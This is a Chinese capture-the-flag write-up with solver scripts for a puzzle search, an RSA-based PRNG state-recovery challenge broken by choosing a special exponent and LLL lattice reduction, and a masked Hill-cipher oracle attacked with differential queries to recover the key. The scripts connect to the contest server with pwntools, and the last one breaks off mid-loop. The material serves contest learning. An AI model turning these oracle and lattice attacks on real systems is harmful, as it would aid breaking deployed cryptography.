拿到了 flag 后：这题到底是想要我怎么做，没看明白，不就是一个简单 dfs 就搜出所有的 flag 了吗。

给一个拿到某个 flag 的代码，输出结果太快了，如果不限制得分再输出的话根本找不到要交的。拿其他 flag 的话改一下输出分数判断部分就行。最后拿到结果记得排序一下再交。

```python
from itertools import product

constraints = ((1, 1, 3), (1, 2, 2), (1, 2, 4),
               (1, 4, 4), (2, 2, 2), (2, 2, 3))
count = [3, 4, 2, 2, 2, 3]

possbile = product([0, 1, 2, 3, 4, 5], repeat=6)

# GMAP=[4,5,1,0,3,2]
GMAP=[0,1,2,3,4,5]

res = []

by_gid = [[] for i in range(len(constraints))]

nodeid = 1

for obj in possbile:
    tp = tuple(sorted([obj[2*j+1] - obj[2*j+0] for j in range(3)]))
    if tp in constraints:
        gid = constraints.index(tp)
        res.append((nodeid, gid, obj))
        nodeid += 1
        by_gid[gid].append(obj)

print(len(res))
for x in by_gid:
    print(len(x))

edges = []

for ia, ga, a in res:
    for ib, gb, b in res:
        if any((a[k*2+1] <= b[k*2+0] or b[k*2+1] <= a[k*2+0]) for k in range(3)):
            edges.append((ia, ib))

print(len(edges))

f = open('nodes.txt', 'w')
print("%d %d" % (len(res), len(edges)), file=f)
for ia, ga, a in res:
    print("%d %d %d %d %d %d %d %d" %
          (ia, GMAP[ga], a[0], a[1], a[2], a[3], a[4], a[5]), file=f)
for ga, gb in edges:
    print("%d %d" % (ga, gb), file=f)
f.close()

```

```cpp
#include <iostream>
#include <cstdio>
#include <vector>
#include <algorithm>
using namespace std;

int n, m;
bool edge[1000][1000];
vector<int> e[1000];

int gid[1000];
vector<int> group[6];

vector<int> nodes[6][6][6];

int mats[1000][3][3];

int rcountr[6] = {3, 4, 2, 2, 2, 3};
int rcount[6] = {3, 4, 2, 2, 2, 3};

int currid[16];
bool placed[6][6][6];

int GMAP[6] = {0, 1, 2, 3, 4, 5};

int buf[1600];

int getscore()
{
    int tot = 0;
    for (int i = 0; i < 16; i++)
    {
        int cid = currid[i];
        for (int a = 0; a < 3; a++)
        {
            for (int b = 0; b < 3; b++)
            {
                for (int c = 0; c < 3; c++)
                {
                    int v = mats[cid][0][a] * 7 * 7 + mats[cid][1][b] * 7 + mats[cid][2][c];
                    buf[tot++] = v;
                }
            }
        }
    }
    sort(buf, buf + tot);
    tot = unique(buf, buf + tot) - buf;
    return tot;
}

void printans()
{
    for (int i = 0; i < 16; i++)
    {
        int cid = currid[i];
        cout << mats[cid][0][0] << mats[cid][0][1];
        cout << mats[cid][1][0] << mats[cid][1][1];
        cout << mats[cid][2][0] << mats[cid][2][1];
    }
    cout << endl;
}

int tmptot = 0;

void dfs(int i, int x, int y, int z)
{
    // if(i>=15)
        // cout<<i<<' '<<x<<' '<<y<<' '<<z<<endl;
    if (i == 16)
    {
        int score=getscore();
        if(score>136 && score<157)
        {
            return;
        }
        cout << score << endl;
        printans();
        return;
    }
    if(x>4)
        return;
    for (auto cid : nodes[x][y][z])
    {
        if (rcount[gid[cid]] == 0)
            continue;
        bool flag = true;
        for (int k = 0; k < i; k++)
        {
            if (!edge[currid[k]][cid])
            {
                flag = false;
                break;
            }
        }
        if (!flag)
            continue;
        rcount[gid[cid]]--;
        currid[i] = cid;
        for (int a = mats[cid][0][0]; a < mats[cid][0][1]; a++)
        {
            for (int b = mats[cid][1][0]; b < mats[cid][1][1]; b++)
            {
                for (int c = mats[cid][2][0]; c < mats[cid][2][1]; c++)
                {
                    placed[a][b][c] = true;
                }
            }
        }
        int nx = x, ny = y, nz = z;
        while (nx<=4 && placed[nx][ny][nz])
        {
            nz++;
            if (nz == 5)
            {
                nz = 0;
                ny++;
                if (ny == 5)
                {
                    ny = 0;
                    nx++;
                }
            }
        }
        dfs(i + 1, nx, ny, nz);
        rcount[gid[cid]]++;
        for (int a = mats[cid][0][0]; a < mats[cid][0][1]; a++)
        {
            for (int b = mats[cid][1][0]; b < mats[cid][1][1]; b++)
            {
                for (int c = mats[cid][2][0]; c < mats[cid][2][1]; c++)
                {
                    placed[a][b][c] = false;
                }
            }
        }
    }
}

int main()
{
    for (int i = 0; i < 6; i++)
    {
        rcount[GMAP[i]] = rcountr[i];
    }
    freopen("nodes.txt", "r", stdin);
    cin >> n >> m;
    for (int i = 1; i <= n; i++)
    {
        int id;
        cin >> id;
        if (id != i)
        {
            cout << "Wrong id" << endl;
            return 0;
        }
        cin >> gid[i];
        if (gid[i] < 0 || gid[i] > 5)
        {
            cout << "Wrong group id" << endl;
            return 0;
        }
        group[gid[i]].push_back(i);
        cin >> mats[i][0][0] >> mats[i][0][1];
        mats[i][0][2] = 6;
        cin >> mats[i][1][0] >> mats[i][1][1];
        mats[i][1][2] = 6;
        cin >> mats[i][2][0] >> mats[i][2][1];
        mats[i][2][2] = 6;
        nodes[mats[i][0][0]][mats[i][1][0]][mats[i][2][0]].push_back(i);
    }
    for (int i = 0; i < m; i++)
    {
        int u, v;
        cin >> u >> v;
        edge[u][v] = true;
        e[u].push_back(v);
    }
    // check double edged
    for (int i = 1; i <= n; i++)
    {
        for (int j = 1; j <= n; j++)
        {
            if (edge[i][j] ^ edge[j][i])
            {
                cout << "Double edged" << endl;
                return 0;
            }
        }
    }

    dfs(0, 0, 0, 0);
    return 0;
}

```

```python
s="010103020135011504021545130202150423121434132502154524250235242435254545350302353501353512452435"

s=[s[i:i+6] for i in range(0,len(s),6)]

s.sort()

s="".join(s)

print(s)
```

## 0x1A 黑客马拉松

比较有意思的题。题目的目标是让你做基于 RSA 的 PRNG 随机数预测。你可以自己选择需要的 p q e，题目两个部分以不同的方式生成一些随机数然后告诉你，之后需要用这些数据来反推出生成器当前的全部状态。后续假设读者已经掌握了基本的数论知识。

具体地，题目在输入完 RSA 参数后，做了一些限制检查：需要是 1024 位 RSA，d 不能太小；e 最好不能太小。这是因为题目中算了一个数字 `k'=max(2048/e,96)`，表示每次从随机数生成器状态中保留 k' 位作为 secret bits，或者说每次状态转移只输出 `1024-k'` 位随机数。显然当我们 e 比较小的时候几乎所有位都被隐藏了，不好。但当 e 比较大时也会隐藏至少 96 位。

之后再看具体的任务。第二个任务看起来就简单（任务分值也低），先看这个。

这个任务只用随机数生成器生成一次数据。在开头先把初始的 1024 bits 状态删掉 k 个，保留 k' 个。这就意味着当我们选取一个稍微大一点的 e 后，真正的初始状态范围非常小，只有 96 位。之后生成器生成 $s_1=s_0^e\bmod N$，并将 $s_1\bmod 2^k$ 作为随机数输出。注意到这时候我们的随机数数组里面只有一个数字，因此后面的循环检查没有任何用。

看完流程后，我们很容易想到一个思路，就是构造特殊 e 值。显然上面限制了 e 不能太小，给 1 或者 2 之类的肯定不合适。但是我们可以给 -1，这样 k' 就还是 96 bits，注意这个时候 -1 应当是 $\bmod \varphi(pq)$ 意义下的。我们设数组 $r_i$ 表示输出的第 $i$ 个随机数，而 $h_i$ 表示在输出第 i 个随机数时被隐藏的高位。即有 $s_i=r_i+2^kh_i$。那么我们就可列出方程 $s_0(r_1+2^kh_1)\equiv1\pmod N$。

如果你对较新较热的格密码比较熟悉的话，已经能看出来了，我们要解的不定方程中几个未知量的范围都非常小，可以用 SVP/CVP 的方法求解。不懂这玩意是什么的可以自行学习，总之就是可以解方程。

很不幸的，具体的理论我也不懂，我只会拿来瞎搞解方程。但是瞎搞在很多场景也够了。

使用格规约算法解 SVP 问题，本质是对于矩阵方程 $AX=B$ 求解出一个 $B$，使得 $B$ 存在一个向量 $A$ 可以被基变换 $X$ 变换过去，而且这个 $B$ 的长度会尽可能地小。因此我们考虑构造一个 $X$ ，使得我们把需要求解的未知量都塞到 $A$ 内后，如果 $A$ 是满足约束的，那么它对应的 $B$ 应该是几乎最小的。

我们先把同余方程变换成一个正常的方程形式： $s_0r_1+2^ks_0h_1-1-kN=0$ ，其中 $k$ 表示取模是被整除掉的倍数。这块比较讨厌的是，我们出现了二次项 $s_0h_1$。但我们先假装它不存在好了，把它当成一个未知数，希望求出来的解里面是能被 $s_0$ 整除的然后再回去算一下 $h_1$。

那么我们再考虑要实现哪些约束：我们要约束 $s_0,s_0h_1,k,1$ 的位数，还要约束方程的等式。注意这块我们把 1 单独拉出来，是因为我们必须要让一个向量经过一个基变换来得到 $B$，因此不能强行指定一个常数。我们在做的时候只能把它当成一个未知数，然后去约束他的大小。

其实这块我列的时候列麻烦了，有一个更好的方法是直接把 1 挪到等式右侧，这样他就是一个天然的 SVP 问题了，我们不需要去单独约束一个值应当为 1 的未知量（虽说这个技巧在用 SVP 规约 CVP 问题时有用到），这时求解应该会更快更准。当然在这题里面并不关键。

因此我们可以考虑，对于矩阵 $X$，我们给他搞五列（即输出向量 $B$ 也有五列），每一列恰好对应我们需要的一条约束。我们也可以认为对于方程的约束就是希望它的长度为 0，每个需要约束的变量都会被我们计算到 $B$ 中。我们希望正确答案的 $B$ 的向量长度应该尽可能小。稍微记得一些不等式的不难产生一个直观感觉：在特定约束下，只有当每一维大小差不多时，他们的长度才会尽可能地短。因此我们要实现对他们范围的约束，需要先估计一下每个数的大概有多少位，然后把他们乘上一个常数缩放到差不多大小。我们不难估出未知量的位数大概分别是 $96,192,95,1$。当然这题给的空间比较宽松，所以误差一点也无所谓。我们把所有数字都填充到 1119 位，因此我们构造矩阵方程：

$$
\begin{bmatrix}
s_0 & s_0h_1 & k & 1
\end{bmatrix} \cdot
\begin{bmatrix}
2^{1023} & 0 & 0 & 0 & 2^{1200}r_1 \\
0 & 2^{927} & 0 & 0 & 2^{1200}2^k \\
0 & 0 & 2^{1024} & 0 & -2^{1200}N \\
0 & 0 & 0 & 2^{1119} & -2^{1200} \\
\end{bmatrix} =
\begin{bmatrix}
2^{1023}s_0 & 2^{927}s_0h_1 & 2^{1024}k & 2^{1119} & 0
\end{bmatrix}
$$

注意到我们最后一列每一项都乘了一个 $2^{1200}$ 的系数。这是因为我们希望这一唯在基变换后应当为 0 ，不能比其他任何一位都要小，因此乘一个比较大的数。

之后我们直接调用 Sage 的 LLL 方法求解可能的 $B$ 就行了。注意到解合法当且仅当最后两维分别为 $2^{1119},0$ 。当然如果是负数也没有关系，我们提前给所有维都取个反就好。有 $B$ 后不难还原出原始未知量。跑一下发现规约后的矩阵第一行就是我们想要的合法的解。非常好。

在写的时候注意到这题还有一个约束，我们选的素数必须是非光滑的。在这一问我们不需要用到任何素数的性质，因此直接生成一个 $2p+1$ 型素数就好，这样 $\varphi(N)$ 比较好处理。

脚本分为 py 和 sage 部分，需要手动粘贴数据交互一下（sage 里面直接写 py 行为不太稳定；py 写 sage 不太会用）。因为人懒，所以有些 check 没过不会自动重试，手动重跑一下就好。

```python
import gmpy2
import random

def gen_strong_prime(bits):
    while True:
        p = random.getrandbits(bits-1)+2**(bits-1)
        if gmpy2.is_prime(p) and gmpy2.is_prime((p-1)//2):
            return p

# p=gen_strong_prime(512)
# q=gen_strong_prime(512)

p,q=12155213570695922176512873300927109803756080011224056966746221004941208209141954384622142605370170107931922522707431646472649051369614055709398881642597423,12701288241011403490235800819661126885208099984919557303041124652821440526566278199803795206905502276887765425763096043572872829353062454291101450625179479

print(p,q,(p*q).bit_length())

assert (p*q).bit_length() == 1024

pd,qd=p//2,q//2

print(pd,qd)

ev=(p-1)*(q-1)-1

print(ev)

from pwn import *

r=remote("202.38.93.111",20230)
r.sendline("211:114514")

r.sendlineafter("p: ",str(p))
r.sendlineafter("q: ",str(q))

r.sendlineafter("A large prime factor of p-1: ",str(pd))
r.sendlineafter("A large prime factor of q-1: ",str(qd))

r.sendlineafter("e: ",str(ev))

r.interactive()
```

```python
p,q=12155213570695922176512873300927109803756080011224056966746221004941208209141954384622142605370170107931922522707431646472649051369614055709398881642597423,12701288241011403490235800819661126885208099984919557303041124652821440526566278199803795206905502276887765425763096043572872829353062454291101450625179479

ev=(p-1)*(q-1)-1

dv=ev

l=974951293504419925721146381112528335984055665316698615312475316428221403924538477359525948693045016161927169476274202614993399272043696562051684886328573854081668800123211518549167393377598723316672992853135413913598070695501235516370341561492580931309063182669118829686985777439
n=p*q
#s s*h k 1

A = Matrix(ZZ, 4,5)

A[0,0]=1*2**1023
A[1,1]=1*2**(1023-96)
A[2,2]=1*2**(1024)
A[3,3]=1*2**(1024+95)
A[0,-1]=l*(2**(1024+128))
A[1,-1]=2**928*(2**(1024+128))
A[2,-1]=-n*(2**(1024+128))
A[3, -1]=-1*(2**(1024+128))

res=A.LLL()
# print(res)

a,b,c,d,e=res[0]
ax=a/2**1023
bx=b/2**(1023-96)
cx=c/2**(1024)
dx=d/2**(1024+95)
ex=e/2**(1024+128)
print(ax,bx,cx,dx,ex)

print(bx%ax)

ths=bx/ax
print(ths*(2**928)+l)
```

之后再看第一问。我们直接用第二问的思路显然不通，因为这一问会生成多个随机数，而我们任何类似的尝试都会导致触发循环节检测然后失败（分 pq 单独做也是）。因此我们考虑有没有类似但是不同的其他做法。

首先我们不难列出等式 $s_i\equiv s_0^{e^i}\pmod N$。我们参考上面的做法，使用一些人类智慧，对上面的做法进行一些修改，可以发现，如果我们选择两个不相邻的状态 $s_a,s_b\ (a\lt b)$ 相乘。可以得到 $s_as_b\equiv s_0^{e^a+e^b}\pmod N$ 。如果我们让他等于 1，这也就意味着上面的指数等于 0，即 $e^{b-a}\equiv -1 \bmod \varphi(N)$ 。首先我们发现了一个非常险但是恰好躲过了的问题：此时有 $s_b\equiv s_0^{e^b}\equiv s_0^{e^ae^{b-a}}\equiv s_a^{-1}\pmod N$，又有 $s_b=s_{2a-b}$ 。这意味着我们出现了周期为 $2a-2b$ 的循环节，如果这个数小于 100 的话是可以被检测到的（直接取 $b=100$ 不难推出最后的检测并不会被绕过）。好在我们只需要用到 $a-b$，而相反数是不会被循环节检测检测到的（除非非常不幸地等于 0）。

我们不妨先来选数。首先 $b-a$ 一定不能是偶数，不然大概算不出 $-1$（不是二次剩余，注意到 $\varphi(N)$ 一定是个偶数）。而显然它们的差是质数比较好，因此我们就直接取 $b=100,a=3$ 好了。之后我们去解方程 $e^{97}\equiv -1 \bmod \varphi(N)$。但是很不幸地，这个方程在大多数情况下都只有一个平凡解： $e=-1$ 。而这个显然会触发循环检测。

好在我们可以去构造不平凡的情况。具体地，只要 $\varphi(\varphi(N))$ 是 97 的倍数，那么这个方程就会有 97 个解。我们随便选一个不平凡的作为选择的 e 就好（可以去验证一下不存在更小的循环，但是考虑到 97 是素数应该不存在，我没仔细想）。

其实直接让 $b-a$ 取偶数可能也可以造出来，但是我觉得分析会比较麻烦所以就没想。

具体解方程的过程我们交给 Sage。注意到这块有个小问题：我们直接让 Sage 解的话， $\varphi(\varphi(N))$ 是个大数，Sage 会先尝试去做大数分解。但我们对他的分解是容易的，因为我们已知 pq。因此我们对 p 和 q 分开处理。我们在构造 pq 时让 $\varphi(\varphi(p))$ 和 $\varphi{(\varphi(q))}$ 都是 97 的倍数，即都是 $2p+1$ 型素数（这使得第二层算 $\varphi$ 时分解更容易），同时 $p$ 又可以表示为 $kx+1$。注意到内层不是素数也够。如果强行要求是素数的话，找 pq 会非常慢（现在已经很慢了）。在让 Sage 解方程时，我们先手动计算一下 $\varphi(\varphi(N))$，之后把关于 pq 的部分分解一下，最后分别喂给 sage，选一组解再做 CRT。

造好 e 和 pq 之后，接下来就是解不定方程了。具体解法和上文一样，只是我们要解的方程是 $(r_a+2^kh_a)(r_b+2^kh_b)\equiv1\pmod N$，即 $r_ar_b+2^kr_ah_b+2^kr_bh_a+2^{2k}h_ah_b-1-kN=0$。当然这个方程看着哈人，实际上只有一个二次项，其他的都是常数。关于矩阵之类的详细构造请自行看代码。

剩下流程就和上一题一样了。

```python
import gmpy2
import random
import traceback
        
def gen_wtf_prime(bits,factor):
    assert factor%2==0
    while True:
        p = random.getrandbits(bits-2)+2**(bits-1)+2**(bits-2)
        nmsl=p//factor//2
        p=(factor*nmsl+1)*2+1
        # if gmpy2.is_prime(nmsl) and gmpy2.is_prime((p-1)//2) and gmpy2.is_prime(p):
        if gmpy2.is_prime((p-1)//2) and gmpy2.is_prime(p):
            return p

fac1=2*97
fac2=2*97

while True:
    try:
        # p=gen_wtf_prime(512,fac1)
        # q=gen_wtf_prime(512,fac2)
        p,q=10114854218290509431142000645094833946630854535470642085902180214238269528487025044026053420405268607854851318335958459696767635729174483012294156936754867,10064177626577072421794831506690173329567193025768920182863348762437441524278593549353474650361311532791508203252971986214984522720913130682201495286487867

        n=p*q

        print(p,q,(p*q).bit_length())

        assert (p*q).bit_length() == 1024
        pd,qd=p//2,q//2
    except KeyboardInterrupt:
        exit(0)
    except:
        traceback.print_exc()
        continue
    break

m=(p-1)*(q-1)

phis=(pd-1)*(qd-1)*2

assert phis%fac1==0

ev=74030663738654514608769948820369530446718019951790071097785393742048552252515400224129576411634693326039329858356710528350621091458104064130778565241754128353833229318295446422670341752822862796223786274092331912010646894288868997863292381062080576274678211640151815466399091784301343373899975197093126177263

print(ev)

from pwn import *

# r=process("python3 rsa_prng.py",shell=True)

r=remote("202.38.93.111",20230)
r.sendline("211:114514")

r.sendlineafter("p: ",str(p))
r.sendlineafter("q: ",str(q))

r.sendlineafter("A large prime factor of p-1: ",str(pd))
r.sendlineafter("A large prime factor of q-1: ",str(qd))

r.sendlineafter("e: ",str(ev))

r.sendlineafter("Choose mission: ","1")

r.recvuntil("[")

states=eval("["+r.recvuntil("]")[:-1].decode()+"]")

# print(states)

print("ST",states[2],states[99])

r.interactive()


```

```python
p,q=10114854218290509431142000645094833946630854535470642085902180214238269528487025044026053420405268607854851318335958459696767635729174483012294156936754867,10064177626577072421794831506690173329567193025768920182863348762437441524278593549353474650361311532791508203252971986214984522720913130682201495286487867
N=p*q
m=(p-1)*(q-1)
n=N

pd=p//2
qd=q//2
phis=(pd-1)*(qd-1)*2

R.<k>=PolynomialRing(Zmod(pd))
L=(k^97+1).roots()
print(L)

R.<k>=PolynomialRing(Zmod(qd))
L=(k^97+1).roots()
print(L)

a1=4845285402479245173426209307448219300669636456211006047166664810245630684732973130027219606433260439131694893373647768906556392187842050923180489979965336
a2=4631781622387427308504770847951943732945620622173042864562238431465382566535318415035778147741515384883853749481881667024751522314464502826846907324361428
a3=3
ans=crt([a1,a2,a3],[pd,qd,4])
for i in range(1,100):
    print(i,pow(a1,i,pd),pow(a1,i,qd))#no loop
print(ans)
```

```python
# solve (s<<928+o)*(h<<928+l)=1+n*k

# s 96bit unknown
# h 96bit unknown
# l 928bit
# o 928bit
# n 1024bit
# k 95bit unknown

#l*o+o*h<<928+s*l<<928+(h*s)<<928<<928=1+n*k

#s h s*h k 1

l,o=1283698321714562772489043396196240206166764433914547027979158652107904825505849146441371639073531530005789140574430516482850987618279667452137121047307565441843361687287874829480440473646005635104362312922051941901834901786255893141293445905870688629053623800731411757371227137715,1942492137416354229131230709532137335357375029360748793789682654253077907942105627074152779623196256852823468545634585572424365867206121523716991160348496235923771104688398785326777117967735550519264601399308133130893761096329281189203503823561518501660789562182197538258068969491

pa=l*(2**928)%n
pb=o*(2**928)%n
pc=2**(928*2)%n
pd=n
pe=(l*o-1)%n

A = Matrix(ZZ, 5,6)

A[0,0]=1*2**1023
A[1,1]=1*2**1023
A[2,2]=1*2**(1023-96)
A[3,3]=1*2**(1024)
A[4,4]=1*2**(1024+95)
A[0,-1]=pa*2**(1024+128)
A[1,-1]=pb*2**(1024+128)
A[2,-1]=pc*2**(1024+128)
A[3,-1]=pd*2**(1024+128)
A[4,-1]=pe*2**(1024+128)

res=A.LLL()
# print(res)

a,b,c,d,e,f=res[0]
ax=a/2**1023
bx=b/2**1023
cx=c/2**(1023-96)
dx=d/2**(1024)
ex=e/2**(1024+95)
fx=f/2**(1024+128)
print(ax,bx,cx,dx,ex,fx)

print(cx==ax*bx)

v1=ax*(2**928)+o
v2=bx*(2**928)+l
print(v1,v2)
```

看了其他选手题解，我表示一脸懵逼：多元 coppersmith 是啥，我怎么不懂。以及这玩意居然还有论文研究吗（虽然好像也挺合理的），我怎么就没想到去查论文，这样就不用想了（虽然好像我也不喜欢读论文）。

## 0x1B 不可加密的异世界 2

经典希尔加密的场景。题目生成了一个在 GF(257) 下的 128x128 的矩阵，作为密钥，把输入编码成 128 维向量，之后计算 $AX$ 作为密文输出。其中 256 会被转成 0。

题目给了一个 400 次的指定明文加密的 oracle，但是这个加密在运行前会给明文异或上一个 mask。mask 是由 flag1 和一些随机数组成。拿到后面的 flag 需要构造一条消息，使得经过加密（不需要异或 mask）之后的消息与原来的明文一样。

第一问做法非常经典，使用带有异或掩码题的经典操作：差分攻击即可。我们先考虑如果这个 oracle 不会异或某个未知数的时候，根据基本的矩阵乘法规则，当我们给明文的第 i 维 +1，则最终的明文就会加上密钥矩阵中的第 i 列的值。如果 +2，就会加上这一列的两倍。但如果我们把加法换成异或，不难发现，当原来明文最后一位是 0 的时候，我们异或 1 就相当于 +1，否则相当于 -1。剩余的高位也同理。而我们又知道，正常情况下操作倒数第二位时，密文的变化量应当是操作倒数第一位的两倍。假设我们已经知道最后一位是 0 的情况下，再观测第二位翻转后密文的变化：如果密文变化是之前的两倍，则说明这一位也是 0（即两位的翻转都恰好对应加一），否则说明这一位是 0。当然如果我们假设最后一位是 1，也有类似的结论（只是非常不幸的，这么做区分不出 11 和 00 之类的完全相反的情况）。

通过这种方式，我们就可以观测出来异或 mask 之后的明文，每一位到底是 0 还是 1，进而倒推出 mask 的值。我们上面提到的相反数的情况仍然是存在的，我们在枚举完所有位后会得到两个可能的数字，但显然我们的 flag 是 ASCII 字符，即高位一定是 0，因此可以得到唯一的可能。

写的时候还有一个小细节：由于题目把 256 处理成 0 了，因此我们要去考虑怎么去还原这个 0（显然 0 和 256 的状态是不一样的）。在这一题里面我们直接不管他就行了，因为出现 0 的概率并不是很大，我们遇到了就再随机一个然后重试就好了。而第一问的 flag1 是确定的，我们超过 oracle 询问次数也无所谓，下次 mask 还是一样的，再开一个连接接着问就好了。

看到其他人的题解，我表示有点蒙古：为什么大家都是在第一问就把 key 求出来了啊，明明不需要的。而且我觉得求出 key 还比较难，那个 400 次卡得有点紧，胡乱写一个是过不了的。

```python
import gmpy2
import random

from pwn import *


r=remote("202.38.93.111",22000)
r.sendline("211:114514")

def work(mess):
    r.sendlineafter(">",mess.hex())
    r.recvuntil("you ciphertext : ")
    c1=r.recvline().strip().decode()
    return bytes.fromhex(c1)

pref="flag{G0od_ma7hem5tical_f0undat1on_lin3ar_al9eBra_makes_sense_ccaff8aa24}"
print(pref,end="")

for pos in range(len(pref),len(pref)+32):
    if pos>=128:
        break
    mess=b"\x11"*(pos)+bytes([0x00])+b"\x11"*(127-pos)
    cr=work(mess)
    cvs=[]
    for bits in range(0,8):
        mess=b"\x11"*(pos)+bytes([1<<bits])+b"\x11"*(127-pos)#hode no 0
        cl=work(mess)
        cvs.append(cl)
    ans=set()
    for i in range(0,256):
        mp=[]
        for bits in range(0,8):
            if (i>>bits)&1==0:
                delt=(cvs[bits][0]-cr[0])%257
            else:
                delt=(cr[0]-cvs[bits][0])%257
            mp.append(delt)
        flags=[]
        for bits in range(1,8):
            flags.append(mp[bits]==mp[0]*(2**bits)%257)
        if flags.count(True)>=7:#hope skip 0 check
            ans.add(i)
    ans=list(ans)
    ans.sort()
    # print(ans)
    assert len(ans)!=0
    assert len(ans) in [1,2]
    # print(chr(ans[0]))
    print(chr(ans[0]),end="")
            
r.interactive()
```

之后再看后面两问。显然这两问的目标都是一样的，只是第三问对字符集大小做了额外限制。我们直接考虑第三问好了。

显然做第三问是需要知道具体密钥的。其实有上一问的做法后我们不难直接搞出密钥。但是具体写了之后才发现略超 400 次，大概是 420  左右。

我们在上一问的做法中提到，如果是 +1，则最终密文的变化量恰好等于密钥的某一列的值。而对于我们已经求出来的 flag1 部分，每次掩码是一样的，即我们可以精准地构造喂给 oracle 的输入，使得两次的输入一定恰好 +1。即我们只需要两次询问就能求出结果。但实践过程中还是有那个 0 的问题。这次我们不能多次连接重试了，因为每次密钥都是随机生成的。我们只能枚举每个 0 可能对应的值到底是 0 还是 256，然后把所有的可能性都考虑进去。如果我们发现可能的集合大小不是 1，就再生成一组输入，之后与之前的输出继续做差分比较，直到确定只有一个可能。此时单个密钥列的期望询问次数大约是 3，够用。

之后我们再考虑对于掩码未知的部分怎么操作。我们可以用上一问的方法接着搞，但是次数可能还是比较多。于是我们利用上面已知掩码部分的方法搞。但这时候我们掩码是未知的，因此不能精准算出我们异或差分后，输入到底是 +1 还是 -1。值得注意的是，掩码随机部分生成时也是全 ASCII 字符，这意味着高位一定是 0。我们利用这个性质，每次只在高位进行差分就可以精准控制了。但是这样还有一个问题，就是当我们遇到 0 需要再收集一组数据时，不能利用前面已经收集的其他数据了，只能再次生成两个差为 128 的数字去询问。这是因为前面的数据的低位不一样，而掩码的低位是不确定的，因此不能算出来精确的差分倍数（其实应该能枚举出来，懒了）。如果这么写的话，在这一步里面确定唯一的可能，期望需要询问 4 次。

如果最后这么写就会发现，我们总共需要询问的次数大概是 420 次。不过其实并不关键，因为我早都注意到一个没有被用上的性质了，这个性质很容易使用。

我们发现，生成的密钥 $A$ 满足 $A'=A-I$ 的秩只有 64。而掩码中已知 flag 的部分长度为 72。这就意味着如果我们已经求出来了前 72 列，那么他们的秩极大概率就已经是 64 了，因此后面剩余的列都可以被线性组合出来。而线性组合的话，我们只需要知道一部分数字就可以求出来线性组合系数了，之后就可以还原它了。这就意味着，我们在第二部分收集列信息的时候，遇到不确定的 0 点，可以直接忽略它，而显然这些点不会特别多。之后我们再来利用前 72 列做一次线性组合的还原，就可以还原出完整的列了。代码使用 Sage 也非常好写。由于我不会直接交叉调用，因此我采用了基于 `os.system` 和文件读写的混合编程。

之后我们获得了完整的密钥，就该考虑如何构造消息了。不难发现我们就是要构造一个 $AX=X$，即 $(A-I)X=0$。而注意到 $A-I$ 的秩只有 64，也就是说我们只需要解一个简单的方程就好了，找一个非全 0 的非平凡解。随便解一下就已经能拿到 flag2 了。

当然，第三问有一个额外的约束，要求每个字符都是 ASCII 字符，即每个点得到值都在 0x20 到 0x7f 之间。由于我们上面已经学过 CVP 了，我们发现这就是一个直球的 CVP 形式，我们构造一个矩阵方程：

$$
\begin{bmatrix}X &K\end{bmatrix}\begin{bmatrix}1 & A^T-I \\
0 & -257\end{bmatrix}=\begin{bmatrix}X & 0\end{bmatrix}
$$

我们希望这个方程的值离 $[79,0]$ 最近。显然方程也有其他构造方法，而且求解速度准确度之类的可能更优，不过也够用了。这块我们也依然混合编程。

具体放缩方法之类的参考前面题。总之直接调用格规约算法就好了。在规约出来后可能会有大量非法值（后面不是 0 的，或者前面虽然够短但是并没有都在界内），而没有合法的答案，我们再重新开个连接试试就行。每次尝试规约大概需要一两分钟，期望尝试次数可能有十次，推荐多线程连接。

```python
import gmpy2
import random
import os
import string
import numpy as np
from sympy import Matrix
from itertools import product

from pwn import *

session=os.urandom(8).hex()

def xor(b1: bytes, b2: bytes):
    assert len(b1) == len(b2)
    return bytes([i ^ j for i, j in zip(b1, b2)])


def pad(msg: bytes, target_len):
    return msg + "".join([random.choice(string.printable) for _ in range(target_len - len(msg))]).encode()


def inverse_mod_matrix(m, mod):
    return Matrix(m).inv_mod(mod)


def sub(b1: list, b2: list):
    assert len(b1) == len(b2)
    return list([(i-j) % 257 for i, j in zip(b1, b2)])


r = remote("202.38.93.111", 22000)
r.sendline("211:114514")

# r=process("sage unencryptable_world2.sage",shell=True)

hint=r.recvuntil("encrypt-ability for you.")
print(hint)

GCNT = 0


def work(mess):
    global GCNT
    GCNT += 1
    # print(mess)
    r.sendlineafter(">", mess.hex())
    r.recvuntil("you ciphertext : ")
    c1 = r.recvline().strip().decode()
    return bytes.fromhex(c1)


def get_possible(arr):  # replace 0 with 256
    ans = [arr*1]
    assert len(arr) == 128
    for i in range(128):
        if arr[i] == 0:
            #copy and replace
            olen = len(ans)
            for j in range(olen):
                ans.append(ans[j]*1)
                ans[j][i] = 256
        continue
    return ans


def merge_possible(list1, list2):
    lista = set(tuple(i) for i in list1)
    listb = set(tuple(i) for i in list2)
    rs = lista & listb
    return [list(i) for i in rs]


pref = "flag{G0od_ma7hem5tical_f0undat1on_lin3ar_al9eBra_makes_sense_ccaff8aa24}"
rmask = pad(pref.encode(), 128)

matline = []

for lines in range(len(pref)):  # mask known
    cips = []
    aips = []
    posps = []
    posslines = None
    line = None
    # line = [None]*128
    while True:
        a = random.randint(0, 127-1)
        if a in aips:
            continue
        basem = b"\x11"*lines+bytes([a ^ rmask[lines]])+b"\x11"*(127-lines)
        basec = work(basem)
        if basec.count(0) >= 4:
            continue
        cips.append(basec)
        posps.append(get_possible(list(basec)))
        aips.append(a)
        n = len(cips)
        for i in range(n-1):
            x, y = aips[i], aips[n-1]
            posa, posb = posps[i], posps[n-1]
            cia,cib=cips[i],cips[n-1]
            if x > y:
                x, y = y, x
                posa, posb = posb, posa
                cia,cib=cib,cia
            invt = pow(y-x, -1, 257)
            myposs = []
            for pa, pb in product(posa, posb):
                nua = sub(pb, pa)
                nua = [i*invt % 257 for i in nua]
                myposs.append(nua)
            if posslines is None:
                tmp = set(tuple(i) for i in myposs)
                posslines = [list(i) for i in tmp]
            else:
                posslines = merge_possible(posslines, myposs)
        # print(n,len(posslines) if posslines is not None else -1)
        if posslines is not None:
            # print(posslines,myposs)
            if len(posslines) == 1:
                line = posslines[0]
                break
            assert len(posslines) > 1
    matline.append(line)
    print(line, lines, GCNT)

for lines in range(len(pref), 128):  # mask unknown
    tried = set()
    got = [None]*128
    while True:
        a = random.randint(0, 127-1)
        if a in tried:
            assert len(tried) < 127
            continue
        tried.add(a)
        basem = b"\x11"*lines+bytes([a])+b"\x11"*(127-lines)
        basec = work(basem)
        deltm = b"\x11"*lines+bytes([(a+128)])+b"\x11"*(127-lines)
        deltc = work(deltm)
        delt = sub(list(deltc), list(basec))
